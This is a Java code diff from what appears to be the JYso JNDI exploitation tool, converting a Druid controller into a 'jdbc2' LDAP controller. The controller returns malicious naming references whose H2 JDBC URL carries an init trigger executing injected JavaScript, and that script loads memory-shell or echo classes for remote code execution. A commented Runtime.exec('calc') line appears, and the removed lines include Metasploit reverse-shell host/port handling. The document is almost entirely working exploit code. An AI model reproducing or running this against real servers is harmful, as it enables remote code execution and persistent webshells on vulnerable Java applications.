@@ -2,10 +2,7 @@ package com.qi4l.JYso.controllers;
 
 import com.qi4l.JYso.enumtypes.GadgetType;
 import com.qi4l.JYso.exceptions.IncorrectParamsException;
-import com.qi4l.JYso.exceptions.UnSupportedActionTypeException;
-import com.qi4l.JYso.exceptions.UnSupportedGadgetTypeException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
-import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.InjShell;
 import com.qi4l.JYso.gadgets.utils.Util;
@@ -14,41 +11,46 @@ import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-
-import javax.naming.Reference;
-import javax.naming.StringRefAddr;
-import java.io.IOException;
-import java.lang.reflect.Field;
+import org.fusesource.jansi.Ansi;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
-@LdapMapping(uri = {"/druid"})
-public class DruidController implements LdapController{
-    private String payloadType;
+@LdapMapping(uri = {"/jdbc2"})
+public class jdbcController2 implements LdapController {
 
+    private String payloadType;
     private String     factoryType;
     private String[]   params;
     private GadgetType gadgetType;
 
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
+        String jscode = null;
         try {
-            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
-            System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
+            Entry  e    = new Entry(base);
 
-            Entry                                   e      = new Entry(base);
-            Reference                               ref    = new Reference("javax.sql.DataSource", "com.alibaba.druid.pool.DruidDataSourceFactory", null);
-            String                                  code   = null;
+            if (payloadType.contains("E-")) {
+                String      ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
+                final Class EchoClass  = Class.forName(ClassNameHandler.searchClassByName(ClassName1));
+                jscode = InjShell.injectClass(EchoClass);
+            }
 
+            if (payloadType.contains("M-")) {
+                String ClassName1 = payloadType.substring(payloadType.indexOf('-') + 1);
+                InjShell.init(params);
+                jscode = Gadgets.createClassT(ClassName1);
+            }
 
-            String JDBC_URL = "";
-            String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
-            ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
-            ref.add(new StringRefAddr("url", JDBC_URL1));
-            ref.add(new StringRefAddr("initialSize", "1"));
-            ref.add(new StringRefAddr("init", "true"));
-            e.addAttribute("javaClassName", "java.lang.String");
-            e.addAttribute("javaSerializedData", Util.serialize(ref));
+            jscode = "//javascript\\n" + jscode;
+            //String cmd = "calc";
+            //String javascript = "//javascript\njava.lang.Runtime.getRuntime().exec(\"" + cmd + "\")";
+            String JDBC_URL1 = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER test BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS '"+ jscode +"'";
+
+            e.addAttribute("objectClass","javaNamingReference");
+            e.addAttribute("javaClassName", "javax.sql.DataSource");
+            e.addAttribute("javaFactory",factoryType);
+            e.addAttribute("javaReferenceAddress", "/0/url/"+JDBC_URL1,"/1/driverClassName/org.h2.Driver","/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1");
+
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
@@ -59,6 +61,7 @@ public class DruidController implements LdapController{
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
+        System.out.println("- JNDI JDBC Refenrence Links ");
         try {
             base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
@@ -67,7 +70,7 @@ public class DruidController implements LdapController{
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
+                System.out.println(Ansi.ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -77,7 +80,7 @@ public class DruidController implements LdapController{
 
             try {
                 factoryType = base.substring(secondIndex + 1, thirdIndex);
-                System.out.println(ansi().render("@|green [+] FactoryType : |@" + factoryType));
+                System.out.println(Ansi.ansi().fgBrightBlue().a("  Factory: " + factoryType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -95,27 +98,10 @@ public class DruidController implements LdapController{
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  JDBC_URL: " + cmd).reset());
                 params = new String[]{cmd};
             }
 
-            if (gadgetType == GadgetType.shell) {
-                String   cmd1         = Util.getCmdFromBase(base);
-                byte[]   decodedBytes = Util.base64Decode(cmd1);
-                String   cmd          = new String(decodedBytes);
-                String[] cmdArray     = cmd.split(" ");
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
-                params = cmdArray;
-            }
-
-            if (gadgetType == GadgetType.msf) {
-                String[] results1 = Util.getIPAndPortFromBase(base);
-                Config.rhost = results1[0];
-                Config.rport = results1[1];
-                System.out.println("[+] RemotHost: " + results1[0]);
-                System.out.println("[+] RemotPort: " + results1[1]);
-                params = results1;
-            }
         } catch (Exception e) {
             if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
 
